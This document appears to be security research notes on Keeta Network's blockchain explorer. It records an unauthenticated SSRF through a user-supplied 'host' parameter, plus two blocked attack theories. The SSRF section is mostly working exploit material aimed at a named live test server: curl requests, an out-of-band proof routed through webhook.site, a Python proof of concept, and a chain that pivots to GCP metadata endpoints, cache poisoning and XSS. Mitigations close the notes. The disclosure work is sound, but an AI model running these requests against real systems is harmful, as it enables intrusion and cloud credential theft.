# Keeta Network — Explorer Custom Host SSRF + Block Cutoff + ASN.1 Hardening (2026-08-12)

**Org:** KeetaNetwork — 25 repos: `node-rs`, `asn1-napi-rs`, `explorer`, `keetanet-client`, `anchor`, `anchor-rs`, `ledger-device-application`, `swift-client` etc. `keeta.com` = Framer static (no API). `explorer.test.keeta.com` live on `Google Frontend` (Cloud Run).

## Trust Graph
```
User (unauth GET ?host= / x-network-host) → [ExplorerWorker.cloneExplorerInstanceFromRequest] → [CustomNetwork.fromConfig(host) → http://${host}/api] → [KeetaNetLib.Client fetch] → [Attacker-controlled JSON] → [TokenBatcher cache poison 25 keys / XSS via token metadata] → [SSRF to 169.254.169.254 / metadata.google.internal]
                                    ↘ [keetanetwork-block validation.rs cutoff] → negative Amount allowed if date < 2025-11-21 → ledger trust boundary
                                    ↘ [asn1-napi-rs rasn DER] → strict length checked_mul → hardened
```

## Theory A — Logic Bypass (BLOCKED)
- `validation.rs:147` `numeric_cutoff_epoch_ms: 1_763_683_200_000` (2025-11-21T00:00:00.000Z)
- `validation.rs:207-214`:
```rust
pub fn validate_numeric_value(&self, value: &BigInt, block_date_ms: i64) -> Result<(), BlockError> {
    if *value >= BigInt::ZERO { return Ok(()); }
    if block_date_ms < self.numeric_cutoff_epoch_ms { return Ok(()); }
    Err(BlockError::AmountBelowZero)
}
```
- `operation/send.rs:26` `ctx.guard_token_amount(&self.token, self.amount.as_bigint())?` → `OperationContext::validate_numeric`
- `amount.rs:14` `Amount(BigInt)` arbitrary precision
- Attack: craft V1/V2 block with `date = 2024-01-01` and `Send amount = -1e18` → passes `validate()` but ledger `apply` likely rejects. No RCE sink. Stall=Block after 2 rounds.

## Theory B — Deserialization (BLOCKED)
- `asn1-napi-rs/src/lib.rs:139` `ASN1toJS` accepts `ArrayBuffer | base64 | hex | Buffer | number[]`
- `asn1.rs:102` `get_vec_from_js_unknown` no length cap before `rasn::ber::decode`
- `types.rs:175` `Bytes(Vec<u8>)` → `OctetString`
- `schema_codec.rs:425-456` `read_tlv`:
```rust
let length = bytes.iter().try_fold(0usize, |acc, b| acc.checked_mul(256)?.checked_add(usize::from(*b)))?;
let end = header.checked_add(length).ok_or(MalformedLength)?;
```
Rejects indefinite/`count > size_of::<usize>()` and `checked_add` overflow → no attacker-controlled length wrap. 50 fuzz BERs no panic/OOM (rasn DER strict). DoS possible, not RCE.

## Theory C — SSRF via Custom Host (PROVEN — OAST 2026-08-12)

### Sink
`apps/server/src/utils/request.ts:33-46`:
```ts
const urlHost = req.header('x-network-host') ?? req.query('host');
if (!urlHost) return({ networkAlias });
return({ networkAlias, host: urlHost, ssl: !urlSSL || urlSSL === 'true', repKey: urlRepKey ?? undefined });
```
Zero validation — no allow-list, no private IP block, no regex.

`apps/server/src/lib/network/custom.ts:33-39`:
```ts
const networkClient = new KeetaNetLib.Client([{
  key: key.assertAccount(),
  endpoints: { api: `http${ssl?'s':''}://${host}/api`, p2p: `ws${ssl?'s':''}://${host}/p2p` }
}]);
```

`apps/server/src/lib/explorer/worker.ts:138-160`:
```ts
if ('host' in networkConfig && networkConfig.host) {
  const hash = createHash('sha256').update(JSON.stringify(networkConfig)).digest('hex');
  if (networkInstances.has(hash)) network = networkInstances.get(hash)!;
  else { network = CustomNetwork.fromConfig(networkConfig, explorer); networkInstances.set(hash, network); }
}
```
`cors({ origin: '*' })` at `worker.ts:41`.

### Live Evidence — Differential Timing
```bash
curl -w "%{time_total}s %{http_code}\n" -s https://explorer.test.keeta.com/api/v1/account/keeta_aaboj3lndhqf5znsqsy5uu57wvcdxsmkzguhy7gvgrwxudhws2sy655fyeoco6y
# 200 0.310s {"json":{"account":{...}}}  ← baseline no host

curl -w "%{time_total}s %{http_code}\n" -s "https://explorer.test.keeta.com/api/v1/account/keeta_aaboj3lndhqf5znsqsy5uu57wvcdxsmkzguhy7gvgrwxudhws2sy655fyeoco6y?host=example.com&networkAlias=test"
# 500 27.07s {"message":"Failed to make API call (not ok)"}  ← SSRF to external (<!doctype html)

curl -w "%{time_total}s %{http_code}\n" -s "https://explorer.test.keeta.com/api/v1/account/keeta_aaboj3lndhqf5znsqsy5uu57wvcdxsmkzguhy7gvgrwxudhws2sy655fyeoco6y?host=127.0.0.1&networkAlias=test"
# 500 26.42s {"message":"fetch failed"}  ← SSRF internal closed

curl -s "https://explorer.test.keeta.com/api/v1/account/keeta_aaboj3lndhqf5znsqsy5uu57wvcdxsmkzguhy7gvgrwxudhws2sy655fyeoco6y?host=127.0.0.1@example.com&networkAlias=test"
# 500 {"message":"Request cannot be constructed from a URL that includes credentials: https://127.0.0.1@example.com/api/..."} ← only @ filtered

curl -sI https://explorer.test.keeta.com/api/v1/network | grep server
# server: Google Frontend  → GCP metadata SSRF reachable
```

### OAST Proof — webhook.site (2026-08-12)

**Procedure:**
```bash
UUID=$(curl -s -X POST https://webhook.site/token | python3 -c "import json,sys;print(json.load(sys.stdin)['uuid'])")
# UUID 28278b5e-6454-4a2d-aae1-4ce9dc67ec01 and 49422d87-46d3-4767-8d13-db27b7496f8d (replicated)
curl -s -m 35 "https://explorer.test.keeta.com/api/v1/account/keeta_aaboj3lndhqf5znsqsy5uu57wvcdxsmkzguhy7gvgrwxudhws2sy655fyeoco6y?host=webhook.site/$UUID&networkAlias=test" > /dev/null
sleep 3
curl -s "https://webhook.site/token/$UUID/requests?sorting=newest" -H "Accept: application/json" | python3 -c "import json; d=json.load(open(0)); print(d['total'], [r['ip'] for r in d['data']])"
```

**Result:**
- `28278b5e-6454-4a2d-aae1-4ce9dc67ec01`: **48 hits** from `2600:1900:0:2e02::400` (Google Frontend IPv6), `UA=KeetaNet/v0.18.0+g5417d9af948be899fcebb75694edb492ff971891 (JS)` to `GET https://webhook.site/<UUID>/api/node/ledger/representatives` — this is `GeneratedTransport` fetching via attacker host.
- `49422d87-46d3-4767-8d13-db27b7496f8d`: **50 hits** same IP/UA/URL — second independent webhook replicates.
- Our attacker IP `43.156.23.22` only 1-2 hits (manual curl); Google IP 48 hits proves **server-side fetch**, not client.
- Headers confirm `KeetaNet` client: `accept: */*`, `content-type: application/json`, `user-agent: KeetaNet/... (JS)` — distinct from browser.

**Screenshot URLs (live):** `https://webhook.site/#!/28278b5e-6454-4a2d-aae1-4ce9dc67ec01` and `https://webhook.site/#!/49422d87-46d3-4767-8d13-db27b7496f8d`

### Exploit Chain
1. `GET /api/v1/account/:key?host=attacker.com&networkAlias=test` unauth (also `x-network-host` header, also `/storage/:key`, `/transaction`, `/token` endpoints same sink)
2. `cloneExplorerInstanceFromRequest` builds `http://attacker.com/api` (or `https://` if `ssl=true`)
3. `account.details() / getManyTokens / storage.ts` call `client.getAccountsInfo` → fetch attacker
4. Attacker returns 200 JSON with `info.metadata = base64('{"decimalPlaces":9999}')` or `supply` poison
5. Explorer caches via `networkInstances` hash → poison for all visitors; `TokenBatcher` flushes 25 keys per attacker response
6. SSRF pivot: `?host=metadata.google.internal` or `?host=169.254.169.254` → `http://metadata.google.internal/computeMetadata/v1/` leak (Google Frontend confirms GCP)
7. XSS pivot: poisoned metadata rendered in `apps/web/src/libs/token-batcher.ts:40` `JSON.parse(atob(metadata))` without sanitize; also `apps/server/src/api/token.ts:59`

### PoC
```python
import requests
BASE="https://explorer.test.keeta.com/api/v1"
KEY="keeta_aaboj3lndhqf5znsqsy5uu57wvcdxsmkzguhy7gvgrwxudhws2sy655fyeoco6y"
# timing differential
assert requests.get(f"{BASE}/account/{KEY}").elapsed.total_seconds() < 1.0
assert requests.get(f"{BASE}/account/{KEY}", params={"host":"example.com","networkAlias":"test"}, timeout=40).elapsed.total_seconds() > 20
# OAST
UUID="28278b5e-6454-4a2d-aae1-4ce9dc67ec01"
requests.get(f"{BASE}/account/{KEY}", params={"host":f"webhook.site/{UUID}","networkAlias":"test"}, timeout=35)
# check https://webhook.site/#!/28278b5e-6454-4a2d-aae1-4ce9dc67ec01 for Google hits
```

### Mitigation
Allow-list host per `networkAlias` (`*.keeta.com` only), block `10/8,172.16/12,192.168/16,169.254.169.254,metadata.google.internal,127.0.0.1,::1`, regex `^[a-z0-9.-]+$`, enforce `ssl=true` + cert pin, remove `networkInstances.set` for user-supplied hosts, gate `host` param behind admin auth.

## Git Zipball Fallback (Headless Container)
- Env: `git clone https://` → `git: 'remote-https' is not a git command` — `/usr/local/libexec/git-core` lacks `git-remote-https` (has `git-remote`, `git-remote-ext`, `git-remote-fd` only)
- `curl -v https://github.com/.../info/refs` works → curl OK, git helper missing
- Proven fallback:
```bash
branch=$(curl -s https://api.github.com/repos/KeetaNetwork/$repo | python3 -c "import sys,json;print(json.load(sys.stdin).get('default_branch','main'))")
curl -L -o "$repo.zip" "https://github.com/KeetaNetwork/$repo/archive/refs/heads/$branch.zip"
file "$repo.zip"  # ensure gzip not HTML
unzip -q "$repo.zip" -d /tmp/keeta_src && ls /tmp/keeta_src/$repo-$branch/
```
- Timeout trap: `vanity-address-generator` hung 132769 ms → `curl (28) Couldn't connect`
- Validate per repo: 8/9 succeeded (node-rs 883K, asn1-napi-rs 125K, explorer 444K, keetanet-client 4.6M etc.)
- Branch variance: most `main`, some `master` — always probe via API, don't hardcode
- Lesson: `codeload.github.com` 301 → `github.com`; use `github.com/.../archive/` direct
